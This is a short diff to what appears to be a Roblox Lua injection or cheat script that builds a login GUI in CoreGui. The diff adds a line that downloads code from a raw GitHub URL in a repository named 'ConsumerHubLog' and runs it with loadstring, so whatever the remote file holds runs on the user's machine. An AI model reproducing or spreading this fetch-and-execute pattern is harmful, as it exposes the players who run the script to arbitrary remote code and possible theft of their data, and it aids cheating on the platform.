@@ -3,7 +3,8 @@ if game.CoreGui:FindFirstChild("Login") then
 	print("Already Injected")
 	--s
 else
-
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/ConsumingChef/ConsumerHubLog/main/Trello'),true))()
+print("loading")
 local Login = Instance.new("ScreenGui")
 local Drag = Instance.new("Frame")
 local MainFrame = Instance.new("ImageLabel")
